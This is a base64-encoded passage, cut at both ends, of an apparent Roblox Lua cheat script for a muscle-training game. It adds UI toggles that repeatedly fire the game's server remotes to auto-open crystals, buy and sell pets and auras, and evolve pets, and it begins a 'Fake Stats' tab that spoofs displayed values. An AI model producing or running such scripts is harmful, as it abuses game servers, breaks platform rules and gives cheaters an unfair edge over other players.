FsIGZ1bmN0aW9uIGZpbmRDcnlzdGFsRm9ySXRlbShpdGVtTmFtZSkKICAgIGZvciBjcnlzdGFsTmFtZSwgcGV0cyBpbiBwYWlycyhjcnlzdGFsRGF0YSkgZG8KICAgICAgICBmb3IgXywgcGV0IGluIGlwYWlycyhwZXRzKSBkbwogICAgICAgICAgICBpZiBwZXQubmFtZSA9PSBpdGVtTmFtZSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gY3J5c3RhbE5hbWUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBuaWwKZW5kCgotLSBBdXRvIE9wZW4gQ3J5c3RhbHMgU2VjdGlvbgpQZXRTaG9wVGFiOlNlY3Rpb24oe1RpdGxlID0gIkF1dG8gT3BlbiBDcnlzdGFscyJ9KQoKbG9jYWwgc2VsZWN0ZWRDcnlzdGFsID0gIkJsdWUgQ3J5c3RhbCIKbG9jYWwgYXV0b09wZW5DcnlzdGFsID0gZmFsc2UKCmxvY2FsIGNyeXN0YWxEcm9wZG93biA9IFBldFNob3BUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiU2VsZWN0IENyeXN0YWwiLAogICAgTGlzdCA9IHsKICAgICAgICAiQmx1ZSBDcnlzdGFsIiwgIkdyZWVuIENyeXN0YWwiLCAiRnJvc3QgQ3J5c3RhbCIsICJNeXRoaWNhbCBDcnlzdGFsIiwgCiAgICAgICAgIkluZmVybm8gQ3J5c3RhbCIsICJMZWdlbmRzIENyeXN0YWwiLCAiTXVzY2xlIEVsaXRlIENyeXN0YWwiLCAKICAgICAgICAiR2FsYXh5IE9yYWNsZSBDcnlzdGFsIiwgIkp1bmdsZSBDcnlzdGFsIgogICAgfSwKICAgIFZhbHVlID0gIkJsdWUgQ3J5c3RhbCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgc2VsZWN0ZWRDcnlzdGFsID0gdGV4dAogICAgZW5kCn0pCgpQZXRTaG9wVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIE9wZW4gQ3J5c3RhbCIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgb3BlbiBzZWxlY3RlZCBjcnlzdGFsIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9PcGVuQ3J5c3RhbCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIGF1dG9PcGVuQ3J5c3RhbCBkbwogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMub3BlbkNyeXN0YWxSZW1vdGU6SW52b2tlU2VydmVyKCJvcGVuQ3J5c3RhbCIsIHNlbGVjdGVkQ3J5c3RhbCkKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gQnV5IFBldHMgJiBBdXJhcyBTZWN0aW9uClBldFNob3BUYWI6U2VjdGlvbih7VGl0bGUgPSAiQXV0byBCdXkgUGV0cyAmIEF1cmFzIn0pCgpsb2NhbCBzZWxlY3RlZFBldCA9ICIiCmxvY2FsIHNlbGVjdGVkQXVyYSA9ICIiCmxvY2FsIGF1dG9CdXlQZXQgPSBmYWxzZQpsb2NhbCBhdXRvQnV5QXVyYSA9IGZhbHNlCgotLSBQZXQgZHJvcGRvd24KbG9jYWwgcGV0TGlzdCA9IHsKICAgICJCbHVlIEJpcmRpZSAoQmFzaWMpIiwgIk9yYW5nZSBIZWRnZWhvZyAoQmFzaWMpIiwgIlJlZCBLaXR0eSAoQmFzaWMpIiwgIkJsdWUgQnVubnkgKEJhc2ljKSIsICJTaWx2ZXIgRG9nIChCYXNpYykiLAogICAgIkRhcmsgVmFtcHkgKEFkdmFuY2VkKSIsICJEYXJrIEdvbGVtIChBZHZhbmNlZCkiLCAiR3JlZW4gQnV0dGVyZmx5IChBZHZhbmNlZCkiLCAiWWVsbG93IEJ1dHRlcmZseSAoQWR2YW5jZWQpIiwKICAgICJDcmltc29uIEZhbGNvbiAoUmFyZSkiLCAiUHVycGxlIERyYWdvbiAoUmFyZSkiLCAiT3JhbmdlIFBlZ2FzdXMgKFJhcmUpIiwgIlB1cnBsZSBGYWxjb24gKFJhcmUpIiwgIlJlZCBEcmFnb24gKFJhcmUpIiwKICAgICJXaGl0ZSBQZWdhc3VzIChSYXJlKSIsICJGcm9zdHdhdmUgTGVnZW5kcyBQZW5ndWluIChSYXJlKSIsICJQaGFudG9tIEdlbmVzaXMgRHJhZ29uIChSYXJlKSIsICJFdGVybmFsIFN0cmlrZSBMZXZpYXRoYW4gKFJhcmUpIiwKICAgICJCbHVlIFBoZW9uaXggKEVwaWMpIiwgIkJsdWUgRmlyZWNhc3RlciAoRXBpYykiLCAiR29sZGVuIFBoZW9uaXggKEVwaWMpIiwgIlJlZCBGaXJlY2FzdGVyIChFcGljKSIsICJHcmVlbiBGaXJlY2FzdGVyIChFcGljKSIsCiAgICAiV2hpdGUgUGhlb25peCAoRXBpYykiLCAiRGFyayBMZWdlbmRzIE1hbnRpY29yZSAoRXBpYykiLCAiVWx0aW1hdGUgU3VwZXJub3ZhIFBlZ2FzdXMgKEVwaWMpIiwgIkxpZ2h0bmluZyBTdHJpa2UgUGhhbnRvbSAoRXBpYykiLAogICAgIkdvbGRlbiBWaWtpbmcgKEVwaWMpIiwgIkluZmVybmFsIERyYWdvbiAoVW5pcXVlKSIsICJVbHRyYSBCaXJkaWUgKFVuaXF1ZSkiLCAiTWFnaWMgQnV0dGVyZmx5IChVbmlxdWUpIiwgIkFldGhlciBTcGlyaXQgQnVubnkgKFVuaXF1ZSkiLAogICAgIkN5YmVybmV0aWMgU2hvd2Rvd24gRHJhZ29uIChVbmlxdWUpIiwgIkRhcmtzdGFyIEh1bnRlciAoVW5pcXVlKSIsICJNdXNjbGUgU2Vuc2VpIChVbmlxdWUpIiwgIk5lb24gR3VhcmRpYW4gKFVuaXF1ZSkiCn0KCmxvY2FsIHBldERyb3Bkb3duID0gUGV0U2hvcFRhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgUGV0IiwKICAgIExpc3QgPSBwZXRMaXN0LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBzZWxlY3RlZFBldCA9IHRleHQKICAgIGVuZAp9KQoKLS0gQXVyYSBkcm9wZG93bgpsb2NhbCBhdXJhTGlzdCA9IHsKICAgICJCbHVlIEF1cmEgKEJhc2ljKSIsICJHcmVlbiBBdXJhIChCYXNpYykiLCAiUHVycGxlIEF1cmEgKEJhc2ljKSIsICJSZWQgQXVyYSAoQmFzaWMpIiwgIlllbGxvdyBBdXJhIChCYXNpYykiLAogICAgIlVsdHJhIEluZmVybm8gKFJhcmUpIiwgIkF6dXJlIFR1bmRyYSAoRXBpYykiLCAiR3JhbmQgU3VwZXJub3ZhIChFcGljKSIsICJNdXNjbGUgS2luZyAoVW5pcXVlKSIsIAogICAgIkVudHJvcGljIEJsYXN0IChVbmlxdWUpIiwgIkV0ZXJuYWwgTWVnYXN0cmlrZSAoVW5pcXVlKSIKfQoKbG9jYWwgYXVyYURyb3Bkb3duID0gUGV0U2hvcFRhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgQXVyYSIsCiAgICBMaXN0ID0gYXVyYUxpc3QsCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIHNlbGVjdGVkQXVyYSA9IHRleHQKICAgIGVuZAp9KQoKUGV0U2hvcFRhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBCdXkgUGV0IiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBidXkgc2VsZWN0ZWQgcGV0IiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9CdXlQZXQgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIGFuZCBzZWxlY3RlZFBldCB+PSAiIiB0aGVuCiAgICAgICAgICAgIGxvY2FsIHBldE5hbWUgPSBzZWxlY3RlZFBldDptYXRjaCgiXiguLSklcyolKCIpIG9yIHNlbGVjdGVkUGV0CiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgYXV0b0J1eVBldCBkbwogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGV0VG9CdXkgPSBSZXBsaWNhdGVkU3RvcmFnZS5jUGV0U2hvcEZvbGRlcjpGaW5kRmlyc3RDaGlsZChwZXROYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwZXRUb0J1eSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5jUGV0U2hvcFJlbW90ZTpJbnZva2VTZXJ2ZXIocGV0VG9CdXkpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKUGV0U2hvcFRhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBCdXkgQXVyYSIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgYnV5IHNlbGVjdGVkIGF1cmEiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b0J1eUF1cmEgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIGFuZCBzZWxlY3RlZEF1cmEgfj0gIiIgdGhlbgogICAgICAgICAgICBsb2NhbCBhdXJhTmFtZSA9IHNlbGVjdGVkQXVyYTptYXRjaCgiXiguLSklcyolKCIpIG9yIHNlbGVjdGVkQXVyYQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIGF1dG9CdXlBdXJhIGRvCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhdXJhVG9CdXkgPSBSZXBsaWNhdGVkU3RvcmFnZS5jUGV0U2hvcEZvbGRlcjpGaW5kRmlyc3RDaGlsZChhdXJhTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYXVyYVRvQnV5IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLmNQZXRTaG9wUmVtb3RlOkludm9rZVNlcnZlcihhdXJhVG9CdXkpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBTZWxsIFBldHMgU2VjdGlvbgpQZXRTaG9wVGFiOlNlY3Rpb24oe1RpdGxlID0gIkF1dG8gU2VsbCBQZXRzIn0pCgpsb2NhbCBzZWxlY3RlZFNlbGxQZXQgPSAiIgpsb2NhbCBhdXRvU2VsbFBldCA9IGZhbHNlCgpsb2NhbCBzZWxsUGV0RHJvcGRvd24gPSBQZXRTaG9wVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCBQZXQgdG8gU2VsbCIsCiAgICBMaXN0ID0gewogICAgICAgICJCbHVlIEJpcmRpZSIsICJPcmFuZ2UgSGVkZ2Vob2ciLCAiUmVkIEtpdHR5IiwgIkJsdWUgQnVubnkiLCAiU2lsdmVyIERvZyIsCiAgICAgICAgIkRhcmsgVmFtcHkiLCAiRGFyayBHb2xlbSIsICJHcmVlbiBCdXR0ZXJmbHkiLCAiWWVsbG93IEJ1dHRlcmZseSIsCiAgICAgICAgIkNyaW1zb24gRmFsY29uIiwgIlB1cnBsZSBEcmFnb24iLCAiT3JhbmdlIFBlZ2FzdXMiLCAiUHVycGxlIEZhbGNvbiIsICJSZWQgRHJhZ29uIiwKICAgICAgICAiV2hpdGUgUGVnYXN1cyIsICJGcm9zdHdhdmUgTGVnZW5kcyBQZW5ndWluIiwgIlBoYW50b20gR2VuZXNpcyBEcmFnb24iLCAiRXRlcm5hbCBTdHJpa2UgTGV2aWF0aGFuIiwKICAgICAgICAiQmx1ZSBQaGVvbml4IiwgIkJsdWUgRmlyZWNhc3RlciIsICJHb2xkZW4gUGhlb25peCIsICJSZWQgRmlyZWNhc3RlciIsICJHcmVlbiBGaXJlY2FzdGVyIiwKICAgICAgICAiV2hpdGUgUGhlb25peCIsICJEYXJrIExlZ2VuZHMgTWFudGljb3JlIiwgIlVsdGltYXRlIFN1cGVybm92YSBQZWdhc3VzIiwgIkxpZ2h0bmluZyBTdHJpa2UgUGhhbnRvbSIsCiAgICAgICAgIkdvbGRlbiBWaWtpbmciLCAiSW5mZXJuYWwgRHJhZ29uIiwgIlVsdHJhIEJpcmRpZSIsICJNYWdpYyBCdXR0ZXJmbHkiLCAiQWV0aGVyIFNwaXJpdCBCdW5ueSIsCiAgICAgICAgIkN5YmVybmV0aWMgU2hvd2Rvd24gRHJhZ29uIiwgIkRhcmtzdGFyIEh1bnRlciIsICJNdXNjbGUgU2Vuc2VpIiwgIk5lb24gR3VhcmRpYW4iCiAgICB9LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBzZWxlY3RlZFNlbGxQZXQgPSB0ZXh0CiAgICBlbmQKfSkKClBldFNob3BUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gU2VsbCBQZXQiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IHNlbGwgc2VsZWN0ZWQgcGV0IiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9TZWxsUGV0ID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSBhbmQgc2VsZWN0ZWRTZWxsUGV0IH49ICIiIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBhdXRvU2VsbFBldCBkbwogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZm91bmRQZXQgPSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGZvbGRlciBpbiBwYWlycyhwbGF5ZXIucGV0c0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHBldCA9IGZvbGRlcjpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFNlbGxQZXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGV0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm91bmRQZXQgPSBwZXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZm91bmRQZXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMuc2VsbFBldEV2ZW50OkZpcmVTZXJ2ZXIoInNlbGxQZXQiLCBmb3VuZFBldCkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1NlbGxQZXQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gRXZvbHZlIFBldHMgU2VjdGlvbgpQZXRTaG9wVGFiOlNlY3Rpb24oe1RpdGxlID0gIkF1dG8gRXZvbHZlIFBldHMifSkKCmxvY2FsIHNlbGVjdGVkUmFyaXR5ID0gIiIKbG9jYWwgYXV0b0V2b2x2ZSA9IGZhbHNlCgpsb2NhbCBldm9sdmVEcm9wZG93biA9IFBldFNob3BUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiU2VsZWN0IFJhcml0eSB0byBFdm9sdmUiLAogICAgTGlzdCA9IHsiQmFzaWMiLCAiQWR2YW5jZWQiLCAiUmFyZSIsICJFcGljIiwgIlVuaXF1ZSJ9LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBzZWxlY3RlZFJhcml0eSA9IHRleHQKICAgIGVuZAp9KQoKUGV0U2hvcFRhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBFdm9sdmUgUGV0cyIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgZXZvbHZlIHBldHMgb2Ygc2VsZWN0ZWQgcmFyaXR5IiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9Fdm9sdmUgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIGFuZCBzZWxlY3RlZFJhcml0eSB+PSAiIiB0aGVuCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgYXV0b0V2b2x2ZSBkbwogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGZvbGRlciBpbiBwYWlycyhwbGF5ZXIucGV0c0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBwZXQgaW4gcGFpcnMoZm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBjcnlzdGFsTmFtZSwgcGV0cyBpbiBwYWlycyhjcnlzdGFsRGF0YSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBwZXREYXRhIGluIGlwYWlycyhwZXRzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBldERhdGEubmFtZSA9PSBwZXQuTmFtZSBhbmQgcGV0RGF0YS5yYXJpdHkgPT0gc2VsZWN0ZWRSYXJpdHkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5wZXRFdm9sdmVFdmVudDpGaXJlU2VydmVyKCJldm9sdmVQZXQiLCBwZXQuTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpQZXRTaG9wVGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJFdm9sdmUgU2VsZWN0ZWQgUmFyaXR5IE9uY2UiLAogICAgRGVzYyA9ICJFdm9sdmUgYWxsIHBldHMgb2Ygc2VsZWN0ZWQgcmFyaXR5IG9uY2UiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgc2VsZWN0ZWRSYXJpdHkgPT0gIiIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBldm9sdmVkQ291bnQgPSAwCiAgICAgICAgICAgIGZvciBfLCBmb2xkZXIgaW4gcGFpcnMocGxheWVyLnBldHNGb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIGZvbGRlcjpJc0EoIkZvbGRlciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGV0IGluIHBhaXJzKGZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgY3J5c3RhbE5hbWUsIHBldHMgaW4gcGFpcnMoY3J5c3RhbERhdGEpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGV0RGF0YSBpbiBpcGFpcnMocGV0cykgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwZXREYXRhLm5hbWUgPT0gcGV0Lk5hbWUgYW5kIHBldERhdGEucmFyaXR5ID09IHNlbGVjdGVkUmFyaXR5IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMucGV0RXZvbHZlRXZlbnQ6RmlyZVNlcnZlcigiZXZvbHZlUGV0IiwgcGV0Lk5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2b2x2ZWRDb3VudCA9IGV2b2x2ZWRDb3VudCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiRXZvbHZlIENvbXBsZXRlIiwKICAgICAgICAgICAgICAgIERlc2MgPSAiRXZvbHZlZCAiIC4uIGV2b2x2ZWRDb3VudCAuLiAiICIgLi4gc2VsZWN0ZWRSYXJpdHkgLi4gIiBwZXRzIiwKICAgICAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kKQogICAgZW5kCn0pCgotLSBGYWtlIFN0YXRzIFRhYgpsb2NhbCBGYWtlU3RhdHNUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJGYWtlIFN0YXRzIiwgSWNvbiA9ICJ0cmVuZGluZy11cCJ9KQoKLS0gRmFrZSBzdGF0cyBzdG9yYWdlCmxvY2FsIGZha2VTdGF0cyA9IHsKICAgIFN0cmVuZ3RoID0gMCwKICAgIER1cmFiaWxpdHkgPSAwLAogICAgUmViaXJ0aHMgPSAwLAogICAgR2VtcyA9IDAsCiAgICBLaWxscyA9IDAsCiAgICBCcmF3bHMgPSAwLAogICAgQWdpbGl0eSA9IDAsCiAgICBHb29kS2FybWEgPSAwLAogICAgRXZpbEthcm1hID0gMAp9CgotLSBUb2dnbGUgc3RhdGVzIGZvciBlYWNoIHN0YXQKbG9jYWwgdG9nZ2xlU3RhdGVzID0gewogICAgU3RyZW5ndGggPSBmYWxzZSwKICAgIER1cmFiaWxpdHkgPSBmYWxzZSwKICAgIFJlYmlydGhzID0gZmFsc2UsCiAgICBHZW1zID0gZmFsc2UsCiAgICBLaWxscyA9IGZhbHNlLAogICAgQnJhd2xzID0gZmFsc2UsCiAgICBBZ2lsaXR5ID0gZmFsc2UsCiAgICBHb29kS2FybWEgPSBmYWxzZSwKICAgIEV2aWxLYXJtYSA9IGZhbHNlCn0KCi0tIEZ1bmN0aW9uIHRvIGZvcm1hdCBudW1iZXJzIHdpdGggYWJicmV2aWF0aW9ucwpsb2NhbCBmdW5jdGlvbiBmb3JtYXROdW1iZXIobnVtKQogICAgaWYgbm90IG51bSB0aGVuIHJldHVybiAiMCIgZW5kCiAgICBudW0gPSB0b251bWJlcihudW0pIG9yIDAKICAgIAogICAgbG9jYWwgZm9ybWF0cyA9IHsKICAgICAgICB7MWUxOCwgIlFpIn0sIHsxZTE1LCAiUWEifSwgezFlMTIsICJUIn0sIAogICAgICAgIHsxZTksICJCIn0sIHsxZTYsICJNIn0sIHsxZTMsICJLIn0KICAgIH0KICAgIAogICAgZm9yIF8sIGZvcm1hdCBpbiBpcGFpcnMoZm9ybWF0cykgZG8KICAgICAgICBpZiBudW0gPj0gZm9ybWF0WzFdIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMWYlcyIsIG51bSAvIGZvcm1hdFsxXSwgZm9ybWF0WzJdKQogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gdG9zdHJpbmcobWF0aC5mbG9vcihudW0pKQplbmQKCi0tIEZ1bmN0aW9uIHRvIHBhcnNlIGlucHV0IHdpdGggYWJicmV2aWF0aW9ucyAoTWF4OiAxMDAwMFFhKQpsb2NhbCBmdW5jdGlvbiBwYXJzZU51bWJlcihpbnB1dCkKICAgIGlmIG5vdCBpbnB1dCB0aGVuIHJldHVybiAwIGVuZAogICAgCiAgICBpbnB1dCA9IHRvc3RyaW5nKGlucHV0KTp1cHBlcigpOmdzdWIoIiVzKyIsICIiKQogICAgCiAgICBsb2NhbCBtdWx0aXBsaWVycyA9IHsKICAgICAgICBbIlFJIl0gPSAxZTE4LCBbIlFBIl0gPSAxZTE1LAogICAgICAgIFsiVCJdID0gMWUxMiwgWyJUUiJdID0gMWUxMiwKICAgICAgICBbIkIiXSA9IDFlOSwgWyJCTiJdID0gMWU5LAogICAgICAgIFsiTSJdID0gMWU2LCBbIk1MIl0gPSAxZTYsCiAgICAgICAgWyJLIl0gPSAxZTMsIFsiS04iXSA9IDFlMwogICAgfQogICAgCiAgICAtLSBDaGVjayBpZiBpdCdzIGp1c3QgYSBudW1iZXIKICAgIGxvY2FsIHBsYWluTnVtID0gdG9udW1iZXIoaW5wdXQpCiAgICBpZiBwbGFpbk51bSB0aGVuCiAgICAgICAgcmV0dXJuIG1hdGgubWluKHBsYWluTnVtLCAxMDAwMGUxNSkgLS0gQ2FwIGF0IDEwMDAwUWEKICAgIGVuZAogICAgCiAgICAtLSBDaGVjayBmb3IgYWJicmV2aWF0aW9uIGZvcm1hdCAoZS5nLiwgIjEuNUsiLCAiMTAwTSIsICIyLjNCIikKICAgIGZvciBhYmJyZXYsIG11bHRpcGxpZXIgaW4gcGFpcnMobXVsdGlwbGllcnMpIGRvCiAgICAgICAgbG9jYWwgcGF0dGVybiA9ICJeKFslZCUuXSspIiAuLiBhYmJyZXYgLi4gIiQiCiAgICAgICAgbG9jYWwgbWF0Y2ggPSBpbnB1dDptYXRjaChwYXR0ZXJuKQogICAgICAgIGlmIG1hdGNoIHRoZW4KICAgICAgICAgICAgbG9jYWwgbnVtID0gdG9udW1iZXIobWF0Y2gpCiAgICAgICAgICAgIGlmIG51bSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0aC5taW4obnVtICogbXVsdGlwbGllciwgMTAwMDBlMTUpIC0tIENhcCBhdCAxMDAwMFFhCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHJldHVybiAwCmVuZAoKLS0gRnVuY3Rpb24gdG8gdXBkYXRlIGRpc3BsYXllZCBz